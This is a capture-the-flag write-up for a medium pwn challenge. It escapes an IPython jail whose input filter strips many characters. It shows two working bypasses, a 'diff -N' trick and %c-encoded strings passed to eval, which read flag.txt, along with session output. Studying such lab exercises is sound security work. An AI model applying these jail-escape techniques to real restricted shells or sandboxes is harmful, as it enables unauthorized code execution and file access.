# Stage 3: ikuchen - pwn - medium

## Challenge

Somehow our cat 🐈 ate all the .py. And some letters, too... Who needs brackets, anyway?  
199.247.4.207 5656

## Solution

Via netcat you get access to a iPython shell. 

iPython has some magic function starting with %, but a cat is eating your characters. 

Entering % will give following output:

```
The cat 🐈 will eat lines starting with `%`. Oh and btw I found out it eats the following: 
`p*[^%\x2D-\x3D\x40-\x50\x27\x5F-\x6D\x20\x76-\x7A]*,*`
```

So we are not able to use characters like * ! $ or letters o p and t

Also every line starting with % gets eaten. 

There are two known solutions
 - ll; diff -N . .. 
 
 diff compares two files, -N treats a missing file as empty. As the the flag.txt does not exists at ```..``` it outputs everything.
 ``` 
 In [1]: ll; diff -N . ..
total 8
-rw-r--r-- 1 root   46 Dec 27 15:00 flag.txt
-rw-r--r-- 1 root 2808 Dec 27 14:10 ikuchen.py
Common subdirectories: ./app and ../app
Common subdirectories: ./bin and ../bin
Common subdirectories: ./boot and ../boot
Common subdirectories: ./dev and ../dev
Common subdirectories: ./etc and ../etc
diff -N ./flag.txt ../flag.txt
1d0
< junior-IPython_jails_are_EASY_2_secu__cthulhu
```
 - encoding strings and eval

 %c encodes ascii values to a character. 102 108 97 103 46 116 120 116 gives you flag.txt and _ reuses the last output.
```
$ netcat 199.247.4.207 5656
  
Oh hi there, I didn't see you come in!
How do you do?
There must be a flag lying around somewhere on this blech.
If you could be so kind and help me find it.
How do 15 seconds of RCE in IPython sound?
Sadly the cat ate some of characters while I baked them. 🐈

/usr/local/lib/python3.8/site-packages/IPython/paths.py:67: UserWarning: IPython parent '/home/c3junior' is not a writable location, using a temp directory.
  warn("IPython parent '{0}' is not a writable location,"
Python 3.8.1 (default, Dec 20 2019, 22:11:13) 
Type 'copyright', 'credits' or 'license' for more information
IPython 7.10.2 -- An enhanced Interactive Python. Type '?' for help.

In [1]:  /'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c'% 111 112 101 110 40 34 102 108 97 103 46 116 120 116 34 41 46 114 101 97 100 40 41
Out[1]: 'open("flag.txt").read()'

In [2]: /eval _
Out[2]: 'junior-IPython_jails_are_EASY_2_secu__cthulhu\n'
